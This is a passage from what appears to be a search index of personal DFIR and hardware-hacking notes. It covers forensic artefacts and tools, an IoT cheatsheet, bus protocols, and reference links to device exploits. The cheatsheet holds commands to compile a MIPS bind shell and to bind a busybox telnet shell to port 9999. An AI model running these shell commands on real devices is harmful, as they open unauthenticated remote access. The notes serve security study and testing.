/home/pi/usb.dd","title":"Linux"},{"location":"dfir/ctf/","text":"CTFs Challenges CTFs: https://aboutdfir.com/challenges-ctfs/ Writeups DEFCON 2018 DFIR CTF - Forensic Challenge (Level 1): https://www.securityartwork.es/2019/01/04/defcon-2018-dfir-ctf-reto-forense-intro-nivel-1/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 2): https://www.securityartwork.es/2019/01/07/defcon-2018-dfir-ctf-reto-forense-nivel-2/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 3): https://www.securityartwork.es/2019/01/08/defcon-2018-dfir-ctf-reto-forense-nivel-3-conclusiones/ DEFCON DFIR CTF 2018\u200a\u2014\u200aLessons Learned: https://medium.com/@monliclican/defcon-dfir-ctf-2018-lessons-learned-890ef781b96c","title":"CTFs"},{"location":"dfir/ctf/#ctfs","text":"Challenges CTFs: https://aboutdfir.com/challenges-ctfs/","title":"CTFs"},{"location":"dfir/ctf/#writeups","text":"DEFCON 2018 DFIR CTF - Forensic Challenge (Level 1): https://www.securityartwork.es/2019/01/04/defcon-2018-dfir-ctf-reto-forense-intro-nivel-1/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 2): https://www.securityartwork.es/2019/01/07/defcon-2018-dfir-ctf-reto-forense-nivel-2/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 3): https://www.securityartwork.es/2019/01/08/defcon-2018-dfir-ctf-reto-forense-nivel-3-conclusiones/ DEFCON DFIR CTF 2018\u200a\u2014\u200aLessons Learned: https://medium.com/@monliclican/defcon-dfir-ctf-2018-lessons-learned-890ef781b96c","title":"Writeups"},{"location":"dfir/important-files/","text":"Important Files Windows $MFT Master File Table Kind of index of all files on the hard drive https://jmharkness.wordpress.com/2011/01/27/mft-file-reference-number/ All the entries of the MFT have a reference number, composed of the number of the MFT entry (6 bytes) and the sequence number (2 bytes) in hexadecimal. Ref: 0x002E00000000F1AB - MFT entry: 00000000F1AB, Sequence number: 0x002E Can be dumped with: http://malware-hunters.net/all-downloads/ MRU Most Recently Used NTUSER.dat Can be read with RegRipper with the plugin runmru . Pulling the UserAssist, which stores the latest applications, shortcuts and documents opened by the user rip.exe -p userassist -r ../NTUSER.DAT USN Journal (Update Sequence Number Journal) Keeps a log of the changes that are made in an NTFS volume http://forensicinsight.org/wp-content/uploads/2013/07/F-INSIGHT-Advanced-UsnJrnl-Forensics-English.pdf Extract the log with FTK Imager parse this journal with the NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker C: \\ $ Extend \\ $ UsrJrnl, Logs C: \\ Windows \\ system32 \\ winevt \\ logs User logins Each time a session is started the user profile is loaded. This action leaves a record in the Microsoft-Windows-User Profile Service log/Operational.evtx Registry C: \\ Windows \\ system32 \\ config Timezone: HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation Computer Name: HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName Last Shutdown: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Windows - ShutdownTime Build Number: HKLM\\SOFTWARE\\Microsoft\\Windows\\NT\\CurrentVersion\\CurrentBuildNumber Important Registry Locations Collection: https://www.dfir.training/resources/downloads/windows-registry Prefetch File extensions of interest http://www.hexacorn.com/blog/2019/02/11/file-extensions-of-interest/","title":"Important Files"},{"location":"dfir/important-files/#important-files","text":"","title":"Important Files"},{"location":"dfir/important-files/#windows","text":"","title":"Windows"},{"location":"dfir/important-files/#mft-master-file-table","text":"Kind of index of all files on the hard drive https://jmharkness.wordpress.com/2011/01/27/mft-file-reference-number/ All the entries of the MFT have a reference number, composed of the number of the MFT entry (6 bytes) and the sequence number (2 bytes) in hexadecimal. Ref: 0x002E00000000F1AB - MFT entry: 00000000F1AB, Sequence number: 0x002E Can be dumped with: http://malware-hunters.net/all-downloads/","title":"$MFT Master File Table"},{"location":"dfir/important-files/#mru-most-recently-used","text":"NTUSER.dat Can be read with RegRipper with the plugin runmru . Pulling the UserAssist, which stores the latest applications, shortcuts and documents opened by the user rip.exe -p userassist -r ../NTUSER.DAT","title":"MRU Most Recently Used"},{"location":"dfir/important-files/#usn-journal-update-sequence-number-journal","text":"Keeps a log of the changes that are made in an NTFS volume http://forensicinsight.org/wp-content/uploads/2013/07/F-INSIGHT-Advanced-UsnJrnl-Forensics-English.pdf Extract the log with FTK Imager parse this journal with the NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker C: \\ $ Extend \\ $ UsrJrnl,","title":"USN Journal (Update Sequence Number Journal)"},{"location":"dfir/important-files/#logs","text":"C: \\ Windows \\ system32 \\ winevt \\ logs","title":"Logs"},{"location":"dfir/important-files/#user-logins","text":"Each time a session is started the user profile is loaded. This action leaves a record in the Microsoft-Windows-User Profile Service log/Operational.evtx","title":"User logins"},{"location":"dfir/important-files/#registry","text":"C: \\ Windows \\ system32 \\ config Timezone: HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation Computer Name: HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName Last Shutdown: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Windows - ShutdownTime Build Number: HKLM\\SOFTWARE\\Microsoft\\Windows\\NT\\CurrentVersion\\CurrentBuildNumber Important Registry Locations Collection: https://www.dfir.training/resources/downloads/windows-registry","title":"Registry"},{"location":"dfir/important-files/#prefetch","text":"","title":"Prefetch"},{"location":"dfir/important-files/#file-extensions-of-interest","text":"http://www.hexacorn.com/blog/2019/02/11/file-extensions-of-interest/","title":"File extensions of interest"},{"location":"dfir/y-Tools/","text":"Tools Widows Images Mount: https://accessdata.com/product-download/ftk-imager-version-4.2.0 Autopsy: http://www.sleuthkit.org/autopsy/ Show attribute ID of NTFS file systems (fls) The Sleuth Kit: http://www.sleuthkit.org/sleuthkit/ NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker SIFT Beginning of partition: mmls Assemble image in raw: ewfmount /mnt/disk1 obtain shadow file information: vshadowinfo -o /mnt/disk1/ewf1 val = partition start value from mmls * 512 Mount shadow: vshadowmount -o /mnt/disk1/ewf1 /mnt/vss mount -o ro,loop /mnt/vss/vss1 /mnt/disk2 Volume serial number Position 0x48 of the BPB (Bios Parameter Block), which is part of the boot sector. $ boot - mount with FTK Imager Or use \"vol\" command https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10) https://www.digital-detective.net/documents/Volume%20Serial%20Numbers.pdf Registry http://www.regxplor.com/ https://ericzimmerman.github.io/#!index. RegRipper - Etracting/parsing information (keys, values, data) from the Registry and presenting it for analysis: https://github.com/keydet89/RegRipper2.8 RECmd - Command line access to the Registry: https://github.com/EricZimmerman/RECmd Incidence Response CIRTKit - Tools For The Computer Incident Response Team: https://github.com/opensourcesec/CIRTKit","title":"Tools"},{"location":"dfir/y-Tools/#tools","text":"","title":"Tools"},{"location":"dfir/y-Tools/#widows","text":"","title":"Widows"},{"location":"dfir/y-Tools/#images","text":"Mount: https://accessdata.com/product-download/ftk-imager-version-4.2.0 Autopsy: http://www.sleuthkit.org/autopsy/ Show attribute ID of NTFS file systems (fls) The Sleuth Kit: http://www.sleuthkit.org/sleuthkit/ NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker SIFT Beginning of partition: mmls Assemble image in raw: ewfmount /mnt/disk1 obtain shadow file information: vshadowinfo -o /mnt/disk1/ewf1 val = partition start value from mmls * 512 Mount shadow: vshadowmount -o /mnt/disk1/ewf1 /mnt/vss mount -o ro,loop /mnt/vss/vss1 /mnt/disk2 Volume serial number Position 0x48 of the BPB (Bios Parameter Block), which is part of the boot sector. $ boot - mount with FTK Imager Or use \"vol\" command https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10) https://www.digital-detective.net/documents/Volume%20Serial%20Numbers.pdf","title":"Images"},{"location":"dfir/y-Tools/#registry","text":"http://www.regxplor.com/ https://ericzimmerman.github.io/#!index. RegRipper - Etracting/parsing information (keys, values, data) from the Registry and presenting it for analysis: https://github.com/keydet89/RegRipper2.8 RECmd - Command line access to the Registry: https://github.com/EricZimmerman/RECmd","title":"Registry"},{"location":"dfir/y-Tools/#incidence-response","text":"CIRTKit - Tools For The Computer Incident Response Team: https://github.com/opensourcesec/CIRTKit","title":"Incidence Response"},{"location":"dfir/z-References/","text":"References Books File System Forensic Analysis: https://www.amazon.com/System-Forensic-Analysis-Brian-Carrier-ebook/dp/B000OZ0N9O New References So you want to be a Digital Forensics professional: https://www.peerlyst.com/posts/so-you-want-to-be-a-digital-forensics-professional-calvin-liu?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Cheatsheets Linux Command Line Forensics and Intrusion Detection Cheat Sheet: https://www.sandflysecurity.com/blog/compromised-linux-cheat-sheet/ \"Hunt Evil: Lateral Movement\": https://www.sans.org/security-resources/posters/dfir/hunt-evil-165?utm_medium=Social utm_source=Twitter utm_content=May+HuntEvil+Registration+Twitter_RSR utm_campaign=DFIR+Poster Windows Forensic Analysis : POSTER: https://www.sans.org/security-resources/posters/windows-forensics-evidence-of/75/download?utm_medium=Social utm_source=Twitter utm_content=June+APAC+WindowsForensics_RSR utm_campaign=DFIR+Poster Advanced Smartphone Forensics : POSTER: https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf","title":"References"},{"location":"dfir/z-References/#references","text":"","title":"References"},{"location":"dfir/z-References/#books","text":"File System Forensic Analysis: https://www.amazon.com/System-Forensic-Analysis-Brian-Carrier-ebook/dp/B000OZ0N9O","title":"Books"},{"location":"dfir/z-References/#new-references","text":"So you want to be a Digital Forensics professional: https://www.peerlyst.com/posts/so-you-want-to-be-a-digital-forensics-professional-calvin-liu?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post","title":"New References"},{"location":"dfir/z-References/#cheatsheets","text":"Linux Command Line Forensics and Intrusion Detection Cheat Sheet: https://www.sandflysecurity.com/blog/compromised-linux-cheat-sheet/ \"Hunt Evil: Lateral Movement\": https://www.sans.org/security-resources/posters/dfir/hunt-evil-165?utm_medium=Social utm_source=Twitter utm_content=May+HuntEvil+Registration+Twitter_RSR utm_campaign=DFIR+Poster Windows Forensic Analysis : POSTER: https://www.sans.org/security-resources/posters/windows-forensics-evidence-of/75/download?utm_medium=Social utm_source=Twitter utm_content=June+APAC+WindowsForensics_RSR utm_campaign=DFIR+Poster Advanced Smartphone Forensics : POSTER: https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf","title":"Cheatsheets"},{"location":"embedded-and-iot/0-cheatsheet/","text":"Cheetshet Cross Compiling Compile for MIPS mips-linux-gnu-gcc bindshell.c -o bindshell -static mips-linux-gnu-strip bindshell ESP Read Flash esptool.py -p /dev/ttyUSB0 -b 460800 read_flash 0 0x200000 flash.bin Check Device config espefuse.py --port /dev/ttyUSB0 summary Binwalk Display information binwalk -t -vvv example-firmware Extract binwalk -e -t -vvv example-firmware Entropy Analysis (identity compression / encryption) binwalk -E example-firmware http://www.devttys0.com/2013/06/differentiate-encryption-from-compression-using-math/ Repacking Firmware ./extract-firmware.sh example-firmware.bin ./build-formware.sh https://github.com/rampageX/firmware-mod-kit/wiki Busybox Command Injection https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/ Bind a telnet shell to port 9999 /bin/busybox telnetd -l/bin/sh -p9999 QMUE Run binaries inside a firmware whereis qemu-mips-static cp /etc/example/qemu-mips-static squashfs-root # From squashfs-root chroot ./ ./qemu-mips-static bin/ls","title":"Cheetshet"},{"location":"embedded-and-iot/0-cheatsheet/#cheetshet","text":"","title":"Cheetshet"},{"location":"embedded-and-iot/0-cheatsheet/#cross-compiling","text":"","title":"Cross Compiling"},{"location":"embedded-and-iot/0-cheatsheet/#compile-for-mips","text":"mips-linux-gnu-gcc bindshell.c -o bindshell -static mips-linux-gnu-strip bindshell","title":"Compile for MIPS"},{"location":"embedded-and-iot/0-cheatsheet/#esp","text":"","title":"ESP"},{"location":"embedded-and-iot/0-cheatsheet/#read-flash","text":"esptool.py -p /dev/ttyUSB0 -b 460800 read_flash 0 0x200000 flash.bin","title":"Read Flash"},{"location":"embedded-and-iot/0-cheatsheet/#check-device-config","text":"espefuse.py --port /dev/ttyUSB0 summary","title":"Check Device config"},{"location":"embedded-and-iot/0-cheatsheet/#binwalk","text":"","title":"Binwalk"},{"location":"embedded-and-iot/0-cheatsheet/#display-information","text":"binwalk -t -vvv example-firmware","title":"Display information"},{"location":"embedded-and-iot/0-cheatsheet/#extract","text":"binwalk -e -t -vvv example-firmware","title":"Extract"},{"location":"embedded-and-iot/0-cheatsheet/#entropy-analysis-identity-compression-encryption","text":"binwalk -E example-firmware http://www.devttys0.com/2013/06/differentiate-encryption-from-compression-using-math/","title":"Entropy Analysis (identity compression / encryption)"},{"location":"embedded-and-iot/0-cheatsheet/#repacking-firmware","text":"./extract-firmware.sh example-firmware.bin ./build-formware.sh https://github.com/rampageX/firmware-mod-kit/wiki","title":"Repacking Firmware"},{"location":"embedded-and-iot/0-cheatsheet/#busybox","text":"","title":"Busybox"},{"location":"embedded-and-iot/0-cheatsheet/#command-injection","text":"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/","title":"Command Injection"},{"location":"embedded-and-iot/0-cheatsheet/#bind-a-telnet-shell-to-port-9999","text":"/bin/busybox telnetd -l/bin/sh -p9999","title":"Bind a telnet shell to port 9999"},{"location":"embedded-and-iot/0-cheatsheet/#qmue","text":"","title":"QMUE"},{"location":"embedded-and-iot/0-cheatsheet/#run-binaries-inside-a-firmware","text":"whereis qemu-mips-static cp /etc/example/qemu-mips-static squashfs-root # From squashfs-root chroot ./ ./qemu-mips-static bin/ls","title":"Run binaries inside a firmware"},{"location":"embedded-and-iot/collections/","text":"FCC Searchable FCC ID Database https://fccid.io/ Command to download all FCC ID documents for i in $(seq 3 4200000); do curl \u2013referer \u2018https://apps.fcc.gov/oetcf/eas/reports/ViewExhibitReport.cfm\u2019 \u2018https://apps.fcc.gov/eas/GetApplicationAttachment.html?calledFromFrame=Y id=\u2019$i -o $i; done https://rehmann.co/blog/command-download-fcc-id-documents/","title":"FCC"},{"location":"embedded-and-iot/collections/#fcc","text":"","title":"FCC"},{"location":"embedded-and-iot/collections/#searchable-fcc-id-database","text":"https://fccid.io/","title":"Searchable FCC ID Database"},{"location":"embedded-and-iot/collections/#command-to-download-all-fcc-id-documents","text":"for i in $(seq 3 4200000); do curl \u2013referer \u2018https://apps.fcc.gov/oetcf/eas/reports/ViewExhibitReport.cfm\u2019 \u2018https://apps.fcc.gov/eas/GetApplicationAttachment.html?calledFromFrame=Y id=\u2019$i -o $i; done https://rehmann.co/blog/command-download-fcc-id-documents/","title":"Command to download all FCC ID documents"},{"location":"embedded-and-iot/protocols/","text":"Protocols UART / Serial All clock speeds are set independently of the signal baud rate is the rate at which bits will be transmitted (bits per second). There is one start bit. There is one stop bit (a low voltage cycle). 8 data bits in the middle. 1 parity bit at the end of the data. Settings Number of data bits/number of parity bits/number of stop bits 8/N/1 (8N1) means 8 data bits, No parity bit, and 1 stop bit Common Baud Rates 9600 19200 38400 57600 115200 Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware UART to Root [Pending]: https://exfil.co/2019/02/14/uart-to-root-the-harder-way/ SPI MISO - Master In Slave Out - Data flow from the slave units to the master unit MOSI - Master Out Slave In - Data flow from the master unit to the slave units SCLK - The clock signal pin - Rising edge of the clock triggers the level of MISO/MOSI to be read as the current bit by the target device. SS/CS - Slave/Chip Select - Select a device, this pin is grounded, telling the particular device to listen up. VCC/GND Typical https://en.wikipedia.org/wiki/Chip_select Daisy Chained The SPI port of each slave is designed to send out during the second group of clock pulses an exact copy of the data it received during the first group of clock pulses. The whole chain acts as a communication shift register. Daisy chaining is often done with shift registers to provide a bank of inputs or outputs through SPI. Each slave copies input to output in the next clock cycle until active low SS line goes high. SPI mode - is the combination of CPOL and CPHA CPOL - Polarity of the clock CPOL=0 is a clock which idles at 0 Leading edge is a rising edge Trailing edge is a falling edge CPOL=1 is a clock which idles at 1 Leading edge is a falling edge Trailing edge is a rising edge CPHA - Timing of the data bits relative to the clock pulses CPHA=0 \"out\" side changes the data on the trailing edge of the preceding clock cycle, while the \"in\" side captures the data on (or shortly after) the leading edge of the clock cycle First bit must be on the MOSI line before the leading clock edge CPHA=1 \"out\" side changes the data on the leading edge of the current clock cycle, while the \"in\" side captures the data on (or shortly after) the trailing edge of the clock cycle For the last cycle, the slave holds the MISO line valid until slave select is deasserted. https://en.wikipedia.org/wiki/Serial_Peripheral_Interface I2C JTAG TDI - Test Data In TDO - Test Data Out - When you daisychain IC\u2019s with JTAG, the TDO of one goes to the TDI of the next, until it loops back to the debug header. TCK - Test Clock - JTAG clock signal, the rising edge triggering a read operation. TCK is not chained, but rather forms a \u2019test clock bus\u2019 along with TMS each IC can see the clock and TMS signals. TMS - Test Mode Select - Read as the clock signal rises, and determines the next state of the internal JTAG controller TRST - Test Reset - An optional pin that can reset the internal test controller, but this isn\u2019t required. Test Access Port (TAP) Controller to handle JTAG commands Minimally 3 registers (instruction register, 2 or more data registers) State-machine that uses the TMS level to decide what to do after each clock cycle TAP controller connects to the boundary cells Boundary Cells can raise/lower a leg\u2019s voltage to influence the behavior of the chip Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware SWD","title":"Protocols"},{"location":"embedded-and-iot/protocols/#protocols","text":"","title":"Protocols"},{"location":"embedded-and-iot/protocols/#uart-serial","text":"All clock speeds are set independently of the signal baud rate is the rate at which bits will be transmitted (bits per second). There is one start bit. There is one stop bit (a low voltage cycle). 8 data bits in the middle. 1 parity bit at the end of the data. Settings Number of data bits/number of parity bits/number of stop bits 8/N/1 (8N1) means 8 data bits, No parity bit, and 1 stop bit Common Baud Rates 9600 19200 38400 57600 115200 Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware UART to Root [Pending]: https://exfil.co/2019/02/14/uart-to-root-the-harder-way/","title":"UART / Serial"},{"location":"embedded-and-iot/protocols/#spi","text":"MISO - Master In Slave Out - Data flow from the slave units to the master unit MOSI - Master Out Slave In - Data flow from the master unit to the slave units SCLK - The clock signal pin - Rising edge of the clock triggers the level of MISO/MOSI to be read as the current bit by the target device. SS/CS - Slave/Chip Select - Select a device, this pin is grounded, telling the particular device to listen up. VCC/GND Typical https://en.wikipedia.org/wiki/Chip_select Daisy Chained The SPI port of each slave is designed to send out during the second group of clock pulses an exact copy of the data it received during the first group of clock pulses. The whole chain acts as a communication shift register. Daisy chaining is often done with shift registers to provide a bank of inputs or outputs through SPI. Each slave copies input to output in the next clock cycle until active low SS line goes high. SPI mode - is the combination of CPOL and CPHA CPOL - Polarity of the clock CPOL=0 is a clock which idles at 0 Leading edge is a rising edge Trailing edge is a falling edge CPOL=1 is a clock which idles at 1 Leading edge is a falling edge Trailing edge is a rising edge CPHA - Timing of the data bits relative to the clock pulses CPHA=0 \"out\" side changes the data on the trailing edge of the preceding clock cycle, while the \"in\" side captures the data on (or shortly after) the leading edge of the clock cycle First bit must be on the MOSI line before the leading clock edge CPHA=1 \"out\" side changes the data on the leading edge of the current clock cycle, while the \"in\" side captures the data on (or shortly after) the trailing edge of the clock cycle For the last cycle, the slave holds the MISO line valid until slave select is deasserted. https://en.wikipedia.org/wiki/Serial_Peripheral_Interface","title":"SPI"},{"location":"embedded-and-iot/protocols/#i2c","text":"","title":"I2C"},{"location":"embedded-and-iot/protocols/#jtag","text":"TDI - Test Data In TDO - Test Data Out - When you daisychain IC\u2019s with JTAG, the TDO of one goes to the TDI of the next, until it loops back to the debug header. TCK - Test Clock - JTAG clock signal, the rising edge triggering a read operation. TCK is not chained, but rather forms a \u2019test clock bus\u2019 along with TMS each IC can see the clock and TMS signals. TMS - Test Mode Select - Read as the clock signal rises, and determines the next state of the internal JTAG controller TRST - Test Reset - An optional pin that can reset the internal test controller, but this isn\u2019t required. Test Access Port (TAP) Controller to handle JTAG commands Minimally 3 registers (instruction register, 2 or more data registers) State-machine that uses the TMS level to decide what to do after each clock cycle TAP controller connects to the boundary cells Boundary Cells can raise/lower a leg\u2019s voltage to influence the behavior of the chip Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware","title":"JTAG"},{"location":"embedded-and-iot/protocols/#swd","text":"","title":"SWD"},{"location":"embedded-and-iot/y-Tools/","text":"Tools Lab Setup RPi as poor man's hardware hacking tool: https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool/ https://systemoverlord.com/static/attachments/iot_toolkit.pdf OSH Stencils: https://www.oshstencils.com Car security canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1 Glasgow Glasgow = Bus Pirate + Bus Blaster + Logic Sniffer https://github.com/whitequark/Glasgow https://twitter.com/whitequark/status/985040607864176640 https://twitter.com/marcan42/status/1090564121068593153 Cutdown version of starshipraider: https://github.com/azonenberg/starshipraider OpenWRT USB Storage https://openwrt.org/docs/guide-user/storage/usb-drives https://openwrt.org/docs/guide-user/additional-software/extroot_configuration https://wiki.openwrt.org/doc/howto/usb.storage https://wiki.openwrt.org/doc/howto/extroot Other FACT - The Firmware Analysis and Comparison Tool: https://fkie-cad.github.io/FACT_core/ Platform Firmware Auditing Tool: https://github.com/PreOS-Security/fwaudit","title":"Tools"},{"location":"embedded-and-iot/y-Tools/#tools","text":"","title":"Tools"},{"location":"embedded-and-iot/y-Tools/#lab-setup","text":"RPi as poor man's hardware hacking tool: https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool/ https://systemoverlord.com/static/attachments/iot_toolkit.pdf OSH Stencils: https://www.oshstencils.com","title":"Lab Setup"},{"location":"embedded-and-iot/y-Tools/#car-security","text":"canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1","title":"Car security"},{"location":"embedded-and-iot/y-Tools/#glasgow","text":"Glasgow = Bus Pirate + Bus Blaster + Logic Sniffer https://github.com/whitequark/Glasgow https://twitter.com/whitequark/status/985040607864176640 https://twitter.com/marcan42/status/1090564121068593153 Cutdown version of starshipraider: https://github.com/azonenberg/starshipraider","title":"Glasgow"},{"location":"embedded-and-iot/y-Tools/#openwrt","text":"","title":"OpenWRT"},{"location":"embedded-and-iot/y-Tools/#usb-storage","text":"https://openwrt.org/docs/guide-user/storage/usb-drives https://openwrt.org/docs/guide-user/additional-software/extroot_configuration https://wiki.openwrt.org/doc/howto/usb.storage https://wiki.openwrt.org/doc/howto/extroot","title":"USB Storage"},{"location":"embedded-and-iot/y-Tools/#other","text":"FACT - The Firmware Analysis and Comparison Tool: https://fkie-cad.github.io/FACT_core/ Platform Firmware Auditing Tool: https://github.com/PreOS-Security/fwaudit","title":"Other"},{"location":"embedded-and-iot/z-References/","text":"References New References Twinkly Twinkly Little Star: https://labs.mwrinfosecurity.com/blog/twinkly-twinkly-little-star search for Xiaomi scooters lock unlock the devices: https://github.com/rani-i/Mi365Locker Mass play any YouTube video, terminate apps and rename Chromecast device(s) obtained from Shodan.io: https://github.com/649/Crashcast-Exploit Project Alias is an open-source parasite to train custom wake-up names for smart home devices while disturbing their built-in microphone: https://github.com/bjoernkarmann/project_alias 35C3 - Modchips of the State: https://www.youtube.com/watch?v=C7H3V7tkxeA (BNC backdoor designed to be inserted into a resistor sitting between the SPI flash and the BNC chip) Rooting the FireTV Cube and Pendant with FireFU: https://blog.exploitee.rs/2018/rooting-the-firetv-cube-and-pendant-with-firefu/ Thunderclap https://twitter.com/marcan42/status/1100655030711939072 Summarized References https://limitedresults.com/2019/01/pwn-the-lifx-mini-white/","title":"References"},{"location":"embedded-and-iot/z-References/#references","text":"","title":"References"},{"location":"embedded-and-iot/z-References/#new-references","text":"Twinkly Twinkly Little Star: https://labs.mwrinfosecurity.com/blog/twinkly-twinkly-little-star search for Xiaomi scooters lock unlock the devices: https://github.com/rani-i/Mi365Locker Mass play any YouTube video, terminate apps and rename Chromecast device(s) obtained from Shodan.io: https://github.com/649/Crashcast-Exploit Project Alias is an open-source parasite to train custom wake-up names for smart home devices while disturbing their built-in microphone: https://github.com/bjoernkarmann/project_alias 35C3 - Modchips of the State: https://www.youtube.com/watch?v=C7H3V7tkxeA (BNC backdoor designed to be inserted into a resistor sitting between the SPI flash and the BNC chip) Rooting the FireTV Cube and Pendant with FireFU: https://blog.exploitee.rs/2018/rooting-the-firetv-cube-and-pendant-with-firefu/ Thunderclap https://twitter.com/marcan42/status/1100655030711939072","title":"New References"},{"location":"embedded-and-iot/z-References/#summarized-references","text":"https://limitedresults.com/2019/01/pwn-the-lifx-mini-white/","title":"Summarized References"},{"location":"embedded-and-iot/scenario/test-conditions/","text":"Test Conditions Replaying of sensor communication Pair device with controlling application without authorization Using guessable identifiers for linking WiFi and other credentials stored in flash","title":"Test Conditions"},{"location":"embedded-and-iot/scenario/test-conditions/#test-conditions","text":"Replaying of sensor communication Pair device with controlling application without authorization Using guessable identifiers for linking WiFi and other credentials stored in flash","title":"Test Conditions"},{"location":"embedded-and-iot/specific/atms/","text":"ATMs References ATM LOGIC ATTACKS: SCENARIOS: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/ATM-Vulnerabilities-2018-eng.pdf","title":"ATMs"},{"location":"embedded-and-iot/specific/atms/#atms","text":"","title":"ATMs"},{"location":"embedded-and-iot/specific/atms/#references","text":"ATM LOGIC ATTACKS: SCENARIOS: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/ATM-Vulnerabilities-2018-eng.pdf","title":"References"},{"location":"embedded-and-iot/specific/automobile/","text":"Automobile References Automobile Hacking, Part 1: The CAN Protocol: https://www.hackers-arise.com/single-post/2017/08/04/Automobile-Hacking-Part-1-The-CAN-Protocol Automobile Hacking, Part 2: The can-utils or SocketCAN: https://www.hackers-arise.com/single-post/2017/08/08/Automobile-Hacking-Part-2-The-can-utils-or-SocketCAN Automobile Hacking, Part 3: Metasploit for Car Hacking: https://www.hackers-arise.com/single-post/2017/10/19/Automobile-Hacking-Part-3-Metasploit-for-Car-Hacking Automobile Hacking, Part 4: How to Hack the Keyless Entry System: https://www.hackers-arise.com/single-post/2018/12/05/Automobile-Hacking-Part-4-How-to-Hack-the-Keyless-Entry-System Awesome Vehicle Security: https://github.com/jaredthecoder/awesome-vehicle-security https://twitter.com/0xcharlie/status/1014892446495305733 Tools canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1","title":"Automobile"},{"location":"embedded-and-iot/specific/automobile/#automobile","text":"","title":"Automobile"},{"location":"embedded-and-iot/specific/automobile/#references","text":"Automobile Hacking, Part 1: The CAN Protocol: https://www.hackers-arise.com/single-post/2017/08/04/Automobile-Hacking-Part-1-The-CAN-Protocol Automobile Hacking, Part 2: The can-utils or SocketCAN: https://www.hackers-arise.com/single-post/2017/08/08/Automobile-Hacking-Part-2-The-can-utils-or-SocketCAN Automobile Hacking, Part 3: Metasploit for Car Hacking: https://www.hackers-arise.com/single-post/2017/10/19/Automobile-Hacking-Part-3-Metasploit-for-Car-Hacking Automobile Hacking, Part 4: How to Hack the Keyless Entry System: https://www.hackers-arise.com/single-post/2018/12/05/Automobile-Hacking-Part-4-How-to-Hack-the-Keyless-Entry-System Awesome Vehicle Security: https://github.com/jaredthecoder/awesome-vehicle-security https://twitter.com/0xcharlie/status/1014892446495305733","title":"References"},{"location":"embedded-and-iot/specific/automobile/#tools","text":"canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1","title":"Tools"},{"location":"embedded-and-iot/specific/bluetooth/","text":"Bluetooth References A Bluetooth low energy capture the flag: https://github.com/hackgnar/ble_ctf My notes on Hacking BLE \u2013 list of resources: https://www.davidsopas.com/my-notes-on-hacking-ble-list-of-resources/","title":"Bluetooth"},{"location":"embedded-and-iot/specific/bluetooth/#bluetooth","text":"","title":"Bluetooth"},{"location":"embedded-and-iot/specific/bluetooth/#references","text":"A Bluetooth low energy capture the flag: https://github.com/hackgnar/ble_ctf My notes on Hacking BLE \u2013 list of resources: https://www.davidsopas.com/my-notes-on-hacking-ble-list-of-resources/","title":"References"},{"location":"embedded-and-iot/specific/cameras/","text":"Cameras References Pentax Hacker Development Kit: https://github.com/i-am-shodan/PHDK https://www.dropbox.com/s/ogez7sb4b0cw92g/hacking_pentax_k30.pdf Canon Hack Development Kit: http://chdk.wikia.com/wiki/CHDK","title":"Cameras"},{"location":"embedded-and-iot/specific/cameras/#cameras","text":"","title":"Cameras"},{"location":"embedded-and-iot/specific/cameras/#references","text":"Pentax Hacker Development Kit: https://github.com/i-am-shodan/PHDK https://www.dropbox.com/s/ogez7sb4b0cw92g/hacking_pentax_k30.pdf Canon Hack Development Kit: http://chdk.wikia.com/wiki/CHDK","title":"References"},{"location":"embedded-and-iot/specific/locks/","text":"Locks References How to open a Tapplock over BLE in under two seconds: https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/","title":"Locks"},{"location":"embedded-and-iot/specific/locks/#locks","text":"","title":"Locks"},{"location":"embedded-and-iot/specific/locks/#references","text":"How to open a Tapplock over BLE in under two seconds: https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/","title":"References"},{"location":"embedded-and-iot/specific/printers/","text":"Printers Discovery Windows SharpPrinter - Discover Printers: https://github.com/rvrsh3ll/SharpPrinter ListNetworks - Enumerate all visible network printers in local network: https://github.com/vinifr/-ListNetworks Linux Praeda - Automated printer data harvesting tool: 